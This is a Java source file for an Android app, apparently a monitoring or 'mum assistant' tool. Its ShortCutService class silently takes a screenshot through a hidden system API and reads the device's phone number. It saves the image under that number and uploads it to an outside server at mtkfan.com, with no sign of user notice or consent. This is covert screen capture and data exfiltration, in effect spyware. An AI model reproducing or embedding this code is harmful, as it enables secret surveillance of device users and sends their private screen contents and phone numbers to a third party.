package com.android.mumassistant.control;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.text.SimpleDateFormat;
import java.util.HashMap;
import java.util.Map;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.Matrix;
import android.os.Environment;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Display;
import android.view.Surface;
import android.view.WindowManager;
import com.android.mumassistant.Utils;
import android.content.SharedPreferences;
import android.preference.PreferenceManager;
import com.android.mumassistant.Utils;
import android.telephony.TelephonyManager;

public class ShortCutService extends Thread{
	private final static String TAG = "ShortCutService";
	private File mFile;
	private Context mContext = null;
	
	public boolean ContextIsOk(Context context){
		if(mContext == null){
			mContext = context;
		}	
		return true;
	}
	
	@Override
	public void run() {
		// TODO Auto-generated method stub
		if(mContext == null){
			return;
		}
		final String telnum = getPhonenum();
		String SDpath = Environment.getExternalStorageDirectory().toString() + File. separator+telnum+".png";
		startShot();
		mFile = new File(SDpath);
		if(mFile != null){
			uploadFile(mFile);
		}
		super.run();
	}

	public void uploadFile(File imageFile) {
		 try {
	            String requestUrl = "http://www.mtkfan.com:8080/upload/upload.action";
	            //请求普通信息
	            Map<String, String> params = new HashMap<String, String>();
	            SimpleDateFormat   sDateFormat   =   new   SimpleDateFormat("yyyy-MM-dd   hh:mm:ss");
	            String   date   =   sDateFormat.format(new   java.util.Date()); 
	            params.put("date", date);
	            params.put("fileName", imageFile.getName());
	            //上传文件
	            FormFile formfile = new FormFile(imageFile.getName(), imageFile, "image", "application/octet-stream");
	            SocketHttpRequester.post(requestUrl, params, formfile);
	            Log.i(TAG, "upload success");
	        } catch (Exception e) {
	            Log.i(TAG, "upload error");
	            e.printStackTrace();
	        }
	}
	
	private void startShot(){

		final String telnum = getPhonenum();
		String ShutCutPath = Environment.getExternalStorageDirectory().toString() + File. separator+telnum+".png";
		WindowManager mWindowManager = (WindowManager)mContext.getSystemService(mContext.WINDOW_SERVICE);
		Display mDisplay = mWindowManager.getDefaultDisplay();
		Matrix mDisplayMatrix = new Matrix();	
		DisplayMetrics mDisplayMetrics = new DisplayMetrics();
		Bitmap mScreenBitmap = null;
		mDisplay.getRealMetrics(mDisplayMetrics);
		float[] dims = { mDisplayMetrics.widthPixels,
				mDisplayMetrics.heightPixels };
		float degrees = getDegreesForRotation(mDisplay.getRotation());
		boolean requiresRotation = (degrees > 0);
		if (requiresRotation) {
			mDisplayMatrix.reset();
			mDisplayMatrix.preRotate(-degrees);
			mDisplayMatrix.mapPoints(dims);
			dims[0] = Math.abs(dims[0]);
			dims[1] = Math.abs(dims[1]);
		}
		//mScreenBitmap = Surface.screenshot((int) dims[0], (int) dims[1]);
		try {
			Class<?> testClass = Class.forName("android.view.SurfaceControl"/*.class.getName()*/);
			Method[] methods = testClass.getMethods();
			Method saddMethod1 = testClass.getMethod("screenshot", new Class[]{int.class ,int.class});
			mScreenBitmap = (Bitmap) saddMethod1.invoke(null, new Object[]{(int) dims[0],(int) dims[1]});
		} catch (ClassNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (NoSuchMethodException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IllegalAccessException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IllegalArgumentException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (InvocationTargetException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		 
		//ByteArrayOutputStream baos = new ByteArrayOutputStream();
		//mScreenBitmap.compress(Bitmap.CompressFormat.PNG, 100, baos);
		
		try {
			FileOutputStream out = new FileOutputStream(ShutCutPath);
			mScreenBitmap.compress(Bitmap.CompressFormat. PNG, 100, out);
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		//Bitmap Bmp = Bitmap.createBitmap( w, h, Config.ARGB_8888 );
		//return baos.toByteArray();
		return;
	}
	
    private float getDegreesForRotation(int value) {
        switch (value) {
        case Surface.ROTATION_90:
            return 360f - 90f;
        case Surface.ROTATION_180:
            return 360f - 180f;
        case Surface.ROTATION_270:
            return 360f - 270f;
        }
        return 0f;
    }
    private String getPhonenum(){
		if(mContext == null){
			return null;
		}
		SharedPreferences shp = PreferenceManager.getDefaultSharedPreferences(mContext);
		TelephonyManager telephonyManager = (TelephonyManager) mContext.
				getSystemService(Context.TELEPHONY_SERVICE);
		String num = telephonyManager.getLine1Number();
		String tel = num.substring(3,num.length());
		if(tel == null){
			return null;		
		}
    	return tel;
    }
}
